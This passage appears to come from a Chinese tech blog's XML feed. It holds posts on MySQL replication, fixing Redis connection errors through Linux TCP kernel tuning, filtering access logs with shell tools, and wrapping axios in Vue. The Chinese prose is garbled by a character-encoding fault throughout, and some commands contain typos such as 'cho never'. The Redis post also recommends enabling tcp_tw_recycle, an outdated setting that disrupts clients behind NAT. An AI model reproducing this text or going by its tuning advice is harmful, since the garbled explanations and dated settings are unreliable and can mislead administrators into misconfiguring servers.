class="line">MASTER_HOST=&#x27;xxxxxxx.mysql.rds.aliyuncs.com&#x27;,</span><br><span class="line">MASTER_PORT=3306,</span><br><span class="line">MASTER_USER=&#x27;username&#x27;,</span><br><span class="line">MASTER_PASSWORD=&#x27;password&#x27;,</span><br><span class="line">master_auto_position=1;</span><br><span class="line"></span><br><span class="line">mysql&gt;start slave;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ä»åº“çŠ¶æ€"><a href="#æŸ¥çœ‹ä»åº“çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹ä»åº“çŠ¶æ€"></a>æŸ¥çœ‹ä»åº“çŠ¶æ€</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;show slave status\G;</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªyesè¡¨ç¤ºæˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Slave_IO_Running: Yes</span><br><span class="line">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisç”±äºè¿æ¥è¿‡å¤šå¯¼è‡´çš„å¼‚å¸¸</title>
      <link href="post/16422/"/>
      <url>post/16422/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è¿‘æœŸæœåŠ¡å™¨åœ¨é«˜å³°çš„æ—¶å€™ç»å¸¸æŠ¥é”™ï¼Œæ—¥å¿—è®°å½•ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Redis-&gt;connect(&#x27;127.0.0.1&#x27;, 6379)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in /wwwroot/test.php on line 9</span><br><span class="line">[13-Jun-2019 11:07:47 PRC] PHP Fatal error:  Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>æ‰§è¡Œå‘½ä»¤ä¿®æ”¹å¦‚ä¸‹ 2 ä¸ªå†…æ ¸å‚æ•°Â Â </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_timestamps=1 å¼€å¯å¯¹äº TCP æ—¶é—´æˆ³çš„æ”¯æŒ, è‹¥è¯¥é¡¹è®¾ç½®ä¸º 0ï¼Œåˆ™ä¸‹é¢ä¸€é¡¹è®¾ç½®ä¸èµ·ä½œç”¨</span><br><span class="line"></span><br><span class="line">sysctl -w net.ipv4.tcp_tw_recycle=1 è¡¨ç¤ºå¼€å¯ TCP è¿æ¥ä¸­ TIME-WAIT sockets çš„å¿«é€Ÿå›æ”¶</span><br><span class="line"></span><br><span class="line">Redis é”™è¯¯ ï¼šCannot assign request</span><br><span class="line"></span><br><span class="line">Could not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request</span><br></pre></td></tr></table></figure><p>ç»æŸ¥å®˜æ–¹ Wiki æ˜¯ç³»ç»Ÿç½‘ç»œé…ç½®é—®é¢˜å·²ç»è§£å†³ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šéœ€è¦ root æƒé™å¯¹ç½‘ç»œè¿›è¡Œé…ç½®ã€‚</p><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>é€šè¿‡è°ƒæ•´å†…æ ¸å‚æ•°è§£å†³ï¼Œ<code>vim /etc/sysctl.conf</code>ï¼ŒåŠ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.tcp_syncookies = 1 #è¡¨ç¤ºå¼€å¯ SYN Cookiesã€‚å½“å‡ºç° SYN ç­‰å¾…é˜Ÿåˆ—æº¢å‡ºæ—¶ï¼Œå¯ç”¨ cookies æ¥å¤„ç†ï¼Œå¯é˜²èŒƒå°‘é‡ SYN æ”»å‡»ï¼Œé»˜è®¤ä¸º 0ï¼Œè¡¨ç¤ºå…³é—­ï¼›</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1 #è¡¨ç¤ºå¼€å¯é‡ç”¨ã€‚å…è®¸å°† TIME-WAIT sockets é‡æ–°ç”¨äºæ–°çš„ TCP è¿æ¥ï¼Œé»˜è®¤ä¸º 0ï¼Œè¡¨ç¤ºå…³é—­ï¼Œé‡Šæ”¾ TIME_WAIT ç«¯å£ç»™æ–°è¿æ¥ä½¿ç”¨ï¼›</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_tw_recycle = 1 #è¡¨ç¤ºå¼€å¯ TCP è¿æ¥ä¸­ TIME-WAIT sockets çš„å¿«é€Ÿå›æ”¶èµ„æºï¼Œé»˜è®¤ä¸º 0ï¼Œè¡¨ç¤ºå…³é—­ã€‚</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_fin_timeout = 30 #ä¿®æ”¹ç³»çµ±é»˜è®¤çš„ TIMEOUT æ—¶é—´ï¼Œè°ƒä½ç«¯å£é‡Šæ”¾åçš„ç­‰å¾…æ—¶é—´ï¼Œé»˜è®¤ä¸º 60sï¼Œä¿®æ”¹ä¸º 15~30s</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_max_tw_buckets = 10000# é€šè¿‡è®¾ç½®å®ƒï¼Œç³»ç»Ÿä¼šå°†å¤šä½™çš„ TIME_WAIT åˆ é™¤æ‰ï¼Œæ­¤æ—¶ç³»ç»Ÿæ—¥å¿—é‡Œå¯èƒ½ä¼šæ˜¾ç¤ºï¼šã€TCP: time wait bucket table overflowã€ï¼Œå¤šæ•°æƒ…å†µä¸‹ä¸ç”¨åœ¨æ„è¿™äº›ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ <code>/sbin/sysctl -p</code> è®©å‚æ•°ç”Ÿæ•ˆã€‚</p><p>ä»¥ä¸Šéƒ½å¯ä»¥é€šè¿‡å‘½ä»¤ï¼ˆsysctl -wï¼‰æ–¹å¼æ“ä½œï¼Œå¦‚ï¼š<code>sysctl -w net.ipv4.tcp_fin_timeout=30</code> ï¼Œåªé€‚åˆä¸´æ—¶ä¿®æ”¹å‚æ•°ã€‚</p><h3 id="TCP-ç½‘ç»œå‚æ•°ä¼˜åŒ–"><a href="#TCP-ç½‘ç»œå‚æ•°ä¼˜åŒ–" class="headerlink" title="TCP ç½‘ç»œå‚æ•°ä¼˜åŒ–"></a>TCP ç½‘ç»œå‚æ•°ä¼˜åŒ–</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1024 65535&quot;</span> &gt; /proc/sys/net/ipv4/ip_local_port_range è®¾ç½®å‘å¤–è¿æ¥å¯ç”¨ç«¯å£èŒƒå›´ è¡¨ç¤ºå¯ä»¥ä½¿ç”¨çš„ç«¯å£ä¸º 65535-1024 ä¸ªï¼ˆ0~1024 ä¸ºå—ä¿æŠ¤çš„)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse è®¾ç½® time_wait è¿æ¥é‡ç”¨ é»˜è®¤ 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycle è®¾ç½®å¿«é€Ÿå›æ”¶ time_wait è¿æ¥ é»˜è®¤ 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 180000 &gt; /proc/sys/net/ipv4/tcp_max_tw_buckets è®¾ç½®æœ€å¤§ time_wait è¿æ¥é•¿åº¦ é»˜è®¤ 262144</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_timestampsÂ  è®¾ç½®æ˜¯å¦å¯ç”¨æ¯”è¶…æ—¶é‡å‘æ›´ç²¾ç¡®çš„æ–¹æ³•æ¥å¯ç”¨å¯¹ RTT çš„è®¡ç®— é»˜è®¤ 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_window_scaling è®¾ç½® TCP/IP ä¼šè¯çš„æ»‘åŠ¨çª—å£å¤§å°æ˜¯å¦å¯å˜ é»˜è®¤ 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 20000 &gt; /proc/sys/net/ipv4/tcp_max_syn_backlog è®¾ç½®æœ€å¤§å¤„äºç­‰å¾…å®¢æˆ·ç«¯æ²¡æœ‰åº”ç­”çš„è¿æ¥æ•° é»˜è®¤ 2048</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 15 &gt; /proc/sys/net/ipv4/tcp_fin_timeoutÂ  è®¾ç½® FIN-WAIT çŠ¶æ€ç­‰å¾…å›æ”¶æ—¶é—´ é»˜è®¤ 60</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;4096 87380 16777216&quot;</span> &gt; /proc/sys/net/ipv4/tcp_rmemÂ  è®¾ç½®æœ€å¤§ TCP æ•°æ®å‘é€ç¼“å†²å¤§å°ï¼Œåˆ†åˆ«ä¸ºæœ€å°ã€é»˜è®¤å’Œæœ€å¤§å€¼Â  é»˜è®¤ 4096Â  Â  87380Â  Â 4194304</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;4096 65536 16777216&quot;</span> &gt; /proc/sys/net/ipv4/tcp_wmem è®¾ç½®æœ€å¤§ TCP æ•°æ® æ¥å—ç¼“å†²å¤§å°ï¼Œåˆ†åˆ«ä¸ºæœ€å°ã€é»˜è®¤å’Œæœ€å¤§å€¼ ã€€é»˜è®¤ 4096Â  Â  87380Â  Â 4194304</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 10000 &gt; /proc/sys/net/core/somaxconnÂ  è®¾ç½®æ¯ä¸€ä¸ªå¤„äºç›‘å¬çŠ¶æ€çš„ç«¯å£çš„ç›‘å¬é˜Ÿåˆ—çš„é•¿åº¦ é»˜è®¤ 128</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 10000 &gt; /proc/sys/net/core/netdev_max_backlog è®¾ç½®æœ€å¤§ç­‰å¾… cpu å¤„ç†çš„åŒ…çš„æ•°ç›® é»˜è®¤ 1000</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 16777216 &gt; /proc/sys/net/core/rmem_max è®¾ç½®æœ€å¤§çš„ç³»ç»Ÿå¥—æ¥å­—æ•°æ®æ¥å—ç¼“å†²å¤§å° é»˜è®¤ 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 262144 &gt; /proc/sys/net/core/rmem_defaultÂ  è®¾ç½®é»˜è®¤çš„ç³»ç»Ÿå¥—æ¥å­—æ•°æ®æ¥å—ç¼“å†²å¤§å° é»˜è®¤ 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 16777216 &gt; /proc/sys/net/core/wmem_maxÂ  è®¾ç½®æœ€å¤§çš„ç³»ç»Ÿå¥—æ¥å­—æ•°æ®å‘é€ç¼“å†²å¤§å° é»˜è®¤ 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 262144 &gt; /proc/sys/net/core/wmem_defaultÂ  è®¾ç½®é»˜è®¤çš„ç³»ç»Ÿå¥—æ¥å­—æ•°æ®å‘é€ç¼“å†²å¤§å° é»˜è®¤ 124928</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 2000000 &gt; /proc/sys/fs/file-max è®¾ç½®æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•° é»˜è®¤ 385583</span><br></pre></td></tr></table></figure><p>ç»“åˆ ab å‘½ä»¤æ¥å‹æµ‹æœºå™¨ä¼˜åŒ–ç½‘ç»œï¼Œè®¾ç½®å®Œè®°å¾—ä¿å­˜</p><h3 id="ä¼˜åŒ–-Redis-å‘½ä»¤"><a href="#ä¼˜åŒ–-Redis-å‘½ä»¤" class="headerlink" title="ä¼˜åŒ– Redis å‘½ä»¤"></a>ä¼˜åŒ– Redis å‘½ä»¤</h3><p>è®¾ç½®å†…å­˜åˆ†é…æ–¹å¼ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/vm/</span>overcommit_memory</span><br></pre></td></tr></table></figure><p>0 è¡¨ç¤ºå†…æ ¸å°†æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„å¯ç”¨å†…å­˜ä¾›åº”ç”¨è¿›ç¨‹ä½¿ç”¨ï¼›å¦‚æœæœ‰è¶³å¤Ÿçš„å¯ç”¨å†…å­˜ï¼Œå†…å­˜ç”³è¯·å…è®¸ï¼›å¦åˆ™ï¼Œå†…å­˜ç”³è¯·å¤±è´¥ï¼Œå¹¶æŠŠé”™è¯¯è¿”å›ç»™åº”ç”¨è¿›ç¨‹ã€‚</p><p>1 è¡¨ç¤ºå†…æ ¸å…è®¸åˆ†é…æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼Œè€Œä¸ç®¡å½“å‰çš„å†…å­˜çŠ¶æ€å¦‚ä½•ã€‚</p><p>2 è¡¨ç¤ºå†…æ ¸å…è®¸åˆ†é…è¶…è¿‡æ‰€æœ‰ç‰©ç†å†…å­˜å’Œäº¤æ¢ç©ºé—´æ€»å’Œçš„å†…å­˜</p><p>å…³é—­ THPï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cho never &gt; <span class="regexp">/sys/</span>kernel<span class="regexp">/mm/</span>transparent_hugepage/enabled</span><br></pre></td></tr></table></figure><p>å°½ç®¡ THP çš„æœ¬æ„æ˜¯ä¸ºæå‡æ€§èƒ½ï¼Œä½†æŸäº›æ•°æ®åº“å‚å•†è¿˜æ˜¯å»ºè®®ç›´æ¥å…³é—­ THP(æ¯”å¦‚è¯´ Oracleã€MongoDB ç­‰)ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æ€§èƒ½ä¸‹é™ï¼Œå†…å­˜é”ï¼Œç”šè‡³ç³»ç»Ÿé‡å¯ç­‰é—®é¢˜ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1024</span> &gt;<span class="regexp">/proc/</span>sys<span class="regexp">/net/</span>core/somaxconn</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†æ¥æ”¶æ–° TCP è¿æ¥ä¾¦å¬é˜Ÿåˆ—çš„å¤§å°ã€‚å¯¹äºä¸€ä¸ªç»å¸¸å¤„ç†æ–°è¿æ¥çš„é«˜è´Ÿè½½ web æœåŠ¡ç¯å¢ƒæ¥è¯´ï¼Œé»˜è®¤çš„ 128 å¤ªå°äº†ã€‚å¤§å¤šæ•°ç¯å¢ƒè¿™ä¸ªå€¼å»ºè®®å¢åŠ åˆ° 1024 æˆ–è€…æ›´å¤šã€‚ æœåŠ¡è¿›ç¨‹ä¼šè‡ªå·±é™åˆ¶ä¾¦å¬é˜Ÿåˆ—çš„å¤§å° (ä¾‹å¦‚ sendmail(8) æˆ–è€… Apache)ï¼Œå¸¸å¸¸åœ¨å®ƒä»¬çš„é…ç½®æ–‡ä»¶ä¸­æœ‰è®¾ç½®é˜Ÿåˆ—å¤§å°çš„é€‰é¡¹ã€‚å¤§çš„ä¾¦å¬é˜Ÿåˆ—å¯¹é˜²æ­¢æ‹’ç»æœåŠ¡ DoS æ”»å‡»ä¹Ÿä¼šæœ‰æ‰€å¸®åŠ©ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç«™è®¿é—®æ—¥å¿—çš„æ—¥å¸¸æ“ä½œ</title>
      <link href="post/63154/"/>
      <url>post/63154/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æ—¥å¸¸å·¥ä½œä¸­ï¼Œç½‘ç«™å¦‚æœé‡åˆ°å¼‚å¸¸æƒ…å†µï¼Œç»å¸¸éœ€è¦æŸ¥çœ‹è®¿é—®æ—¥å¿—æ¥æŸ¥æ‰¾é—®é¢˜ï¼Œç”±äºæ—¥å¿—æ–‡ä»¶åºå¤§æŸ¥æ‰¾èµ·æ¥å¾ˆä¸æ”¾ä¾¿ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸€äº›è¿‡æ»¤å¤„ç†</p><span id="more"></span><h3 id="ç­›é€‰å‡ºå¯ç–‘IPçš„è®¿é—®æ—¥å¿—"><a href="#ç­›é€‰å‡ºå¯ç–‘IPçš„è®¿é—®æ—¥å¿—" class="headerlink" title="ç­›é€‰å‡ºå¯ç–‘IPçš„è®¿é—®æ—¥å¿—"></a>ç­›é€‰å‡ºå¯ç–‘IPçš„è®¿é—®æ—¥å¿—</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> example.<span class="built_in">log</span> | <span class="keyword">grep</span> <span class="string">&#x27;127.0.0.1&#x27;</span> &gt; <span class="number">127.0</span>.<span class="number">0.1</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><h3 id="ç­›é€‰å‡ºæ—¥å¿—çš„æŸä¸€åˆ—æ•°æ®"><a href="#ç­›é€‰å‡ºæ—¥å¿—çš„æŸä¸€åˆ—æ•°æ®" class="headerlink" title="ç­›é€‰å‡ºæ—¥å¿—çš„æŸä¸€åˆ—æ•°æ®"></a>ç­›é€‰å‡ºæ—¥å¿—çš„æŸä¸€åˆ—æ•°æ®</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F <span class="string">&quot;,&quot;</span> &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2</span><span class="string">&quot; &quot;</span><span class="variable">$3</span>&quot;&#125;&#x27; example.<span class="keyword">log</span></span><br></pre></td></tr></table></figure><h3 id="æ ¹æ®æŸåˆ—æ•°æ®è¿›è¡Œå»é‡"><a href="#æ ¹æ®æŸåˆ—æ•°æ®è¿›è¡Œå»é‡" class="headerlink" title="æ ¹æ®æŸåˆ—æ•°æ®è¿›è¡Œå»é‡"></a>æ ¹æ®æŸåˆ—æ•°æ®è¿›è¡Œå»é‡</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">awk</span> -F <span class="string">&quot;,&quot;</span>  <span class="string">&#x27;!a[<span class="variable">$2</span>,<span class="variable">$3</span>]++&#x27;</span>  example.log</span><br></pre></td></tr></table></figure><h3 id="å»é™¤é‡å¤è¡Œ"><a href="#å»é™¤é‡å¤è¡Œ" class="headerlink" title="å»é™¤é‡å¤è¡Œ"></a>å»é™¤é‡å¤è¡Œ</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span> <span class="built_in">example</span>.<span class="built_in">log</span> | uniq</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue ä¸­ axios çš„å°è£…</title>
      <link href="post/11917/"/>
      <url>post/11917/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è™½ç„¶ï¼Œaxios æ˜¯ä¸ªä¼˜ç§€çš„ HTTP åº“ï¼Œä½†æ˜¯ï¼Œç›´æ¥åœ¨é¡¹ç›®ä¸­ä½¿ç”¨å¹¶ä¸æ˜¯é‚£ä¹ˆæ–¹ä¾¿ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œä¸€å®šç¨‹åº¦ä¸Šçš„é…ç½®å°è£…ï¼Œå‡å°‘é‡å¤ä»£ç ï¼Œæ–¹ä¾¿è°ƒç”¨ã€‚</p><span id="more"></span><h3 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h3><p>å…¶å®ï¼Œç½‘ä¸Šå…³äº axios å°è£…çš„ä»£ç ä¸å°‘ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨å…¥å£æ–‡ä»¶ï¼ˆmain.jsï¼‰ä¸­è¿›è¡Œ axios å…¨å±€å¯¹è±¡å±æ€§å®šä¹‰çš„å½¢å¼è¿›è¡Œé…ç½®ï¼Œç±»ä¼¼äºå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">axios.defaults.timeout</span> = <span class="number">10000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ¡ˆæœ‰ä¸¤ä¸ªä¸è¶³ï¼Œé¦–å…ˆï¼Œaxios å°è£…ä»£ç è€¦åˆè¿›å…¥å…¥å£æ–‡ä»¶ï¼Œä¸æ–¹ä¾¿åæœŸç»´æŠ¤ï¼›å…¶æ¬¡ï¼Œä½¿ç”¨ axios å…¨å±€å¯¹è±¡å±æ€§å®šä¹‰çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œä»£ç è¿‡äºé›¶æ•£ã€‚</p><p>é’ˆå¯¹é—®é¢˜ä¸€ï¼Œæˆ‘ä½¿ç”¨äº† Vue æºç ç»“æ„ä¸­çš„ä¸€å¤§æ ¸å¿ƒæ€æƒ³â€”â€”å°†åŠŸèƒ½æ‹†åˆ†ä¸ºæ–‡ä»¶ï¼Œæ–¹ä¾¿åæœŸçš„ç»´æŠ¤ã€‚å•ç‹¬åˆ›å»ºä¸€ä¸ª <code>http.js</code> æˆ–è€… <code>http.ts</code> æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­å¼•å…¥ axios å¹¶å¯¹å…¶è¿›è¡Œå°è£…é…ç½®ï¼Œæœ€åå°†å…¶å¯¼å‡ºå¹¶æŒ‚è½½åˆ° Vue çš„åŸå‹ä¸Šå³å¯ã€‚æ­¤æ—¶ï¼Œæ¯æ¬¡ä¿®æ”¹ axios é…ç½®ï¼Œåªéœ€è¦ä¿®æ”¹å¯¹åº”çš„æ–‡ä»¶å³å¯ï¼Œä¸ä¼šå½±å“åˆ°ä¸ç›¸å…³çš„åŠŸèƒ½ã€‚</p><p>é’ˆå¯¹é—®é¢˜äºŒï¼Œé‡‡ç”¨ axios å®˜æ–¹æ¨èçš„ï¼Œé€šè¿‡é…ç½®é¡¹åˆ›å»º axios å®ä¾‹çš„æ–¹å¼è¿›è¡Œé…ç½®å°è£…ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> http.js</span><br><span class="line">import axios from <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="regexp">//</span> åˆ›å»º axios å®ä¾‹</span><br><span class="line">const service = axios.create(&#123;</span><br><span class="line">  <span class="regexp">//</span> é…ç½®é¡¹</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ ¹æ®ç¯å¢ƒè®¾ç½®-baseURL"><a href="#æ ¹æ®ç¯å¢ƒè®¾ç½®-baseURL" class="headerlink" title="æ ¹æ®ç¯å¢ƒè®¾ç½® baseURL"></a>æ ¹æ®ç¯å¢ƒè®¾ç½® baseURL</h3><p>baseURL å±æ€§æ˜¯è¯·æ±‚åœ°å€å‰ç¼€ï¼Œå°†è‡ªåŠ¨åŠ åœ¨ url å‰é¢ï¼Œé™¤é url æ˜¯ä¸ªç»å¯¹åœ°å€ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œåœ¨å¼€å‘ç¯å¢ƒä¸‹å’Œç”Ÿäº§æ¨¡å¼ä¸‹æœ‰ç€ä¸åŒçš„ baseURLï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ä¸åŒçš„ç¯å¢ƒåˆ‡æ¢ä¸åŒçš„ baseURLã€‚</p><p>åœ¨å¼€å‘æ¨¡å¼ä¸‹ï¼Œç”±äºæœ‰ç€ devServer çš„å­˜åœ¨ï¼Œéœ€è¦æ ¹æ®å›ºå®šçš„ url å‰ç¼€è¿›è¡Œè¯·æ±‚åœ°å€é‡å†™ï¼Œæ‰€ä»¥ï¼Œåœ¨å¼€å‘ç¯å¢ƒä¸‹ï¼Œå°† baseURL è®¾ä¸ºæŸä¸ªå›ºå®šçš„å€¼ï¼Œæ¯”å¦‚ï¼š<code>/apis</code>ã€‚</p><p>åœ¨ç”Ÿäº§æ¨¡å¼ä¸‹ï¼Œæ ¹æ® Java æ¨¡å—çš„è¯·æ±‚å‰ç¼€çš„ä¸åŒï¼Œå¯ä»¥è®¾ç½®ä¸åŒçš„ baseURLã€‚</p><p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¹æ® process.env.NODE_ENV åŒºåˆ†çŠ¶æ€ï¼Œåˆ‡æ¢ä¸åŒçš„ baseURL</span></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">baseURL: process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span> ? <span class="string">`/java`</span> : <span class="string">&#x27;/apis&#x27;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ç»Ÿä¸€è®¾ç½®è¯·æ±‚å¤´"><a href="#ç»Ÿä¸€è®¾ç½®è¯·æ±‚å¤´" class="headerlink" title="ç»Ÿä¸€è®¾ç½®è¯·æ±‚å¤´"></a>ç»Ÿä¸€è®¾ç½®è¯·æ±‚å¤´</h3><p>åœ¨è¿™é‡Œå’Œå¤§å®¶èŠä¸€ä¸ªé—®é¢˜ï¼Œä»€ä¹ˆæ˜¯å°è£…ï¼Ÿåœ¨æˆ‘çœ‹æ¥ï¼Œå°è£…æ˜¯é€šè¿‡æ›´å°‘çš„è°ƒç”¨ä»£ç 